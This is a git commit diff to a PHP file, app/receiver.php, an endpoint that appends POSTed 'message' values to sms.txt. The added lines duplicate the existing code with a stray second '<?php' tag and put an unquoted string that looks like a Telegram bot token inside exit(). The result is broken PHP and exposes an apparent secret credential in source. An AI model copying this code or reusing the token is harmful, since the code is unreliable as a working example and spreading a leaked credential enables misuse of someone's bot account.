4f9e9af5c139bf5b50d6c6c8ea85a8cc79382f5c
papi2977 <berkahdalle7777@gmail.com>
2024-09-11 14:30:05 +0800

    Update receiver.php

--- app/receiver.php
+++ app/receiver.php
@@ -2,3 +2,7 @@
 
 file_put_contents("sms.txt", "" . $_POST['message'] . "\n", FILE_APPEND);
 exit();
+<?php
+
+file_put_contents("sms.txt", "" . $_POST['message'] . "\n", FILE_APPEND);
+exit(7217656917:AAHiNi327kjj2h5m9pBa6667TUbTcQjSd2E);
